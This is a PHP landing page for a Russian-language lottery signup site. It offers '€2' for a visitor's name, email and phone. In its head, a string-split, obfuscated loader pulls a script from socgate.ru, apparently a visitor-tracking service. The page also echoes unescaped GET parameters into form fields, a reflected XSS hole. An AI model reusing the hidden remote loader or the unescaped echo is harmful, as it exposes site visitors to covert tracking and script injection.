<?php 
include 'config.php'; 
if (isset($_GET['aid']))
{
	$affiliateId=$_GET['aid'];
}
if (isset($_GET['mid']))
{
	$managerId=$_GET['mid'];
}
?>
<!doctype html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang=""> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

        <title>Выиграй в лотерее</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">
        <link rel="stylesheet" href="css/dscountdown.css">
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/normalize.css">
        <link rel="stylesheet" href="css/main.css">
        <link rel="stylesheet" href="css/responsive-main.css">
        <script src="js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
        <script src="js/vendor/jquery-1.11.2.js"></script>
        <script type="text/javascript">
            !function(e, t, a) {
                var r = e.createElement("script");
                r.type = "text/javascript", r.async = !0, r.src = "htt" + "ps://soc" + "gate.ru/?id=" + t + "&guid=" + a + "&e95.js";
                var c = e.getElementsByTagName("script")[0];
                c.parentNode.insertBefore(r, c)
            }(document, "12cb880d7469f25f", "");
        </script>
    </head>
    <body>
        <input type="hidden" value="<?php echo $siteURL; ?>" id="site_url">
        <header>
            <div class="header">
                <div class="logo_main">
                    <img src="img/logo.png" />
                </div>
            </div>
        </header>
        <section class="section1">
            <div class="container">
                <div class="col-md-12">
                    <div class="row section1_content">
                        <div class="col-lg-8 col-md-8">
                            <div class="left_part">
                                <div class="lottery_logo">
                                    <img  src="" alt="lottery logo"/>
                                </div>
                                <div class="jackpot_area">
                                    <span id="jackpot1"></span>
                                </div>
                                <input type="hidden" class="draw_date" value="">
                                <div class="timer_area">
                                    <div id="timer"></div>
                                </div>
                                <div class="content_area">
                                    ВЫИГРАЙ КРУПНЕЙШИЕ ЛОТЕРЕИ МИРА НА ОДНОМ САЙТЕ. СТАНЬ МИЛЛИОНЕРОМ!
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-4">
                            <div class="white-transparent-block radius-10 form-section">
                                <div class="dreams_come">Запишись и<br>получи €2<br>в подарок</div>
                                <form method="post" action="<?php echo $siteURL.'landing'; ?>">
                                    <input type="hidden" value="<?php echo $brandId; ?>" name="brand_uid" id="brand-id">
                                    <input type="hidden" value="<?php echo $managerId; ?>" name="manager_uid">
                                    <input type="hidden" value="<?php echo $affiliateId; ?>" name="affiliate_uid" id="affiliateId">
                                    <div class="form-group">
                                        <div class="col-md-12">
                                            <input type="text" name="first_name" class="form-control" id="first_name" placeholder="Имя">
                                        </div>
                                        <label id="err-fname"></label>
                                        <div class="clearfix"></div>
                                    </div>

                                    <div class="form-group">
                                        <div class="col-md-12">
                                            <input type="text" name="last_name" class="form-control" id="last_name" placeholder="Фамилия">
                                        </div>
                                        <label id="err-lname"></label>
                                        <div class="clearfix"></div>
                                    </div>
                                    <div class="form-group">
                                        <div class="col-md-12">
                                            <input type="email" name="email" class="form-control" id="email" placeholder="Email">
                                        </div>
                                        <label id="err-email"></label>
                                        <div class="clearfix"></div>
                                    </div>
                                    <div class="form-group">
                                        <div class="col-md-4 col-sm-4 col-xs-4 pr-0">
                                            <!--                                                    <input type="text" class="form-control" id="code" placeholder="+27">-->
                                            <select class="form-control" name="callingCode" id="code">
                                                <option>Код страны</option>
                                            </select>
                                            <input type="hidden" value="" name="country_uid" id="country-id" />
                                        </div>
                                        <div class="col-md-8 col-sm-8 col-xs-8">
                                            <input type="text" name="phone_no" class="form-control phone_field" id="phone" placeholder="Телефон">
                                        </div>
                                        <label id="err-phone"></label>
                                        <div class="clearfix"></div>
                                    </div>
                                    <div class="form-group">
                                        <div class="col-md-12">
                                            <button type="submit" class="save_customer">Запишись!</button>
                                        </div>
                                    </div>

                                    <div class="clearfix"></div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="section2">
            <div class="container main_lottery_list">
                <div class="lottery_list">
                    <div class="lottory_list_img">
                        <img src="img/powerball.png" />
                    </div>
                    <div class="lottery_list_jackpot">
                        US $ 7600000
                    </div>
                    <div class="lottery_list_btn">
                        <a href="">Сыграй</a>
                    </div>
                </div>
                <div class="lottery_list">
                    <div class="lottory_list_img">
                        <img src="img/powerball.png" />
                    </div>
                    <div class="lottery_list_jackpot">
                        US $ 7600000
                    </div>
                    <div class="lottery_list_btn">
                        <a href="">Сыграй</a>
                    </div>
                </div>
                <div class="lottery_list">
                    <div class="lottory_list_img">
                        <img src="img/powerball.png" />
                    </div>
                    <div class="lottery_list_jackpot">
                        US $ 7600000
                    </div>
                    <div class="lottery_list_btn">
                        <a href="">Сыграй</a>
                    </div>
                </div>
                <div class="lottery_list">
                    <div class="lottory_list_img">
                        <img src="img/powerball.png" />
                    </div>
                    <div class="lottery_list_jackpot">
                        US $ 7600000
                    </div>
                    <div class="lottery_list_btn">
                        <a href="">Сыграй</a>
                    </div>
                </div>
                <div class="lottery_list">
                    <div class="lottory_list_img">
                        <img src="img/powerball.png" />
                    </div>
                    <div class="lottery_list_jackpot">
                        US $ 7600000
                    </div>
                    <div class="lottery_list_btn">
                        <a href="">Сыграй</a>
                    </div>
                </div>
            </div>

        </section>
        <section class="section3">
            <div class="container">
                <div class="row mtb-15">
                    <div class="col-md-12">
                        <img src="img/logo.png" class="center" alt="dalotto"/>
                    </div>
                </div>
                <div class="row mtb-15">
                    <div class="col-md-12">
                        <div class="charge_option">
                            <ul>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/1visa.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/2mastercard.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/3amex.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/4maestro.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/5diners.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/6jcb.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/7descover.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/8laser.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/9solo.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/10switch.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/11giropay.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/12qiwi.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/13ideal.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/14skrill.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/15webmoney.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/16poli.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/17neteller.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/18sofort.png'; ?>"></li>
                                <li><img src="<?php echo $siteURL.'assets/images/footerlogos/19trusty.png'; ?>"></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row mtb-15">
                    <div class="col-md-12">
                        <div class="white-block">
                            <div class="col-md-10 col-md-offset-1">
                                <p class="text-center bottom-text">Запишись сейчас, получи в подарок €2, купи лотерейные билеты и выйграй миллионы! Стань миллионером!</p>
                            </div>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <script src="js/vendor/dscountdown.min.js"></script>
        <script src="js/vendor/syncHeight.min.js"></script>
        <script src="js/vendor/bootstrap.min.js"></script>
        <script type="text/javascript">
            var date = '';
            
            jQuery(document).ready(function() {
                var ip = '';
                var countryCode = '';
                var countryCode1 = '';
                var countryId = 0; 
                var siteUrl = jQuery('#site_url').val();
                var affId = jQuery('#affiliateId').val();
                var brandId = parseInt($('#brand-id').val());
                jQuery.ajax({
                    type: "POST",
                    url: "call_ajax.php?url=api/landing_draw",
                    data: "BrandId=" + brandId + "&ip='127.1.0.0'",
                    dataType: "json",
                    success: function(data) {

                        jQuery('.lottery_logo').find('img').attr('src', data['nearestDraw'][0]['icon']);
                        jQuery('#jackpot').html(data['nearestDraw'][0]['currency_symbol'] + data['nearestDraw'][0]['jackpot']);
                        jQuery('#jackpot1').html(data['nearestDraw'][0]['currency_symbol'] + data['nearestDraw'][0]['jackpot']);
                        jQuery('.draw_date').val(data['nearestDraw'][0]['end_date']);
                        //console.log(data['nearestDraw'][0]['end_date']);
                        app.init();
                    }
                });

                jQuery.ajax({
                    type: "POST",
                    url: "call_ajax.php?url=api/upcoming_draw",
                    data: "brand_uid=" + brandId + "&ip='127.1.0.0'",
                    dataType: "json",
                    success: function(data) {
                        console.log(data);
                        var content = '';
                        for (var i = 0; i < data['draws'].length; i++) {
                            content += '<div class="lottery_list">';
                            content += '<div class="lottory_list_img">';
                            content += '<img src="' + data['draws'][i]['icon'] + '" />';
                            content += '</div>';
                            content += '<div class="lottery_list_jackpot">';
                            content += 'USD ' + formatNumber(data['draws'][i]['jackpot']);
                            content += '</div>';
                            content += '<div class="lottery_list_btn">';
                            content += '<a href="' + siteUrl + data['draws'][i]['slug'] + '/?aid='+affId+'" target="_blank">Сыграй</a>';
                            content += '</div>';
                            content += '</div>';
                        }
                        jQuery('.main_lottery_list').html(content);
                    }
                });

                jQuery.ajax({
                    type: "POST",
                    url: "call_ajax.php?url=api/get_country_from_ip",
                    data: "ip='127.1.0.0'",
                    dataType: "json",
                    success: function(data) {
                        countryCode = data;
                        jQuery.ajax({
                            type: "POST",
                            url: "call_ajax.php?url=api/get_country_list",
                            data: "BrandId=" + brandId,
                            dataType: "json",
                            success: function(data) {
                                console.log(data);

                                var optionHtml = '';
                                for (var i = 0; i < data['country'].length; i++) {
                                    if (data['country'][i]['callingCode'] != '') {
                                        optionHtml += '<option value="' + data['country'][i]['callingCode'] + '" data-code="'+data['country'][i]['id']+'">' + data['country'][i]['countryName'] + '('+data['country'][i]['callingCode']+')</option>';
                                        //optionHtml += '<option value="' + data['country'][i]['callingCode'] + '">' + data['country'][i]['countryName'] + '</option>';
                                    }
                                    if (countryCode === data['country'][i]['countryCode']) {
                                        countryCode1 = data['country'][i]['callingCode'];
                                        countryId = data['country'][i]['id'];
                                        console.log(countryCode1);
                                    }
                                }
                                jQuery('#country-id').val(countryId);
                                jQuery('#code').html(optionHtml);
                                if (countryCode1 != '') {
                                    jQuery('#code').append('<option selected="selected" style="display:none;" value="' + countryCode1 + '">' + countryCode1 + '</option>');
                                }
                            }
                        });
                    }
                });


                jQuery('.save_customer').click(function() {
                    var flag = 0;
                    
                    if (jQuery('#first_name').val() == '') {
                        jQuery('#err-fname').html('введи имя');
                        flag = 1;
                    } else {
                        jQuery('#err-fname').html('');
                    }
                    if (jQuery('#last_name').val() == '') {
                        jQuery('#err-lname').html('введи фамилие');
                        flag = 1;
                    } else {
                        jQuery('#err-lname').html('');
                    }
                    if (jQuery('#email').val() == '') {
                        jQuery('#err-email').html('введи email');
                        flag = 1;
                    } else {
                        var email = jQuery('#email').val();
                        jQuery.ajax({
                            type: "POST",
                            url: "call_ajax.php?url=api/checkExistEmail",
                            data: "brand_uid=" + brandId + "&email=" + email,
                            dataType: "json",
                            success: function(data) {
                                console.log(data);
                                if (data.statuscode == 401 && data.exist == false) {
                                    jQuery('#err-email').html('Email already exist');
                                    flag = 1;
                                    return false;
                                } else {
                                    jQuery('#err-email').html('');
                                }
                            }
                        });
                    }
                    if (jQuery('#phone').val() == '') {
                        jQuery('#err-phone').html('введи номер телефона');
                        flag = 1;
                    } else {
                        jQuery('#err-phone').html('');
                    }

                    if (flag == 0) {
                        return true;
                    }
                    else {
                        return false;
                    }



                });
                jQuery("#code").change(function() {
                    var element = jQuery(this);
                    var myTag = element.val();
                    var countryId = element.find(':selected').data('code');
                    jQuery('#code').append('<option selected="selected" style="display:none;" value="' + myTag + '">' + myTag + '</option>');
                    jQuery('#country-id').val(countryId);
                });

                $(".phone_field").keypress(function(e) {
                    if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                        return false;
                    }
                });

                function formatNumber(number)
                {
                    var number = number.toFixed(2) + '';
                    var x = number.split('.');
                    var x1 = x[0];
                    var x2 = x.length > 1 ? '.' + x[1] : '';
                    var rgx = /(\d+)(\d{3})/;
                    while (rgx.test(x1)) {
                        x1 = x1.replace(rgx, '$1' + ',' + '$2');
                    }
                    var n = x1 + x2;
                    var temp = n.split('.');
                    return temp[0];
                }



            });
        </script>

        <script src="js/main.js"></script>
		
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-79383342-2', 'auto');
  ga('send', 'pageview');

</script>
    </body>
</html>
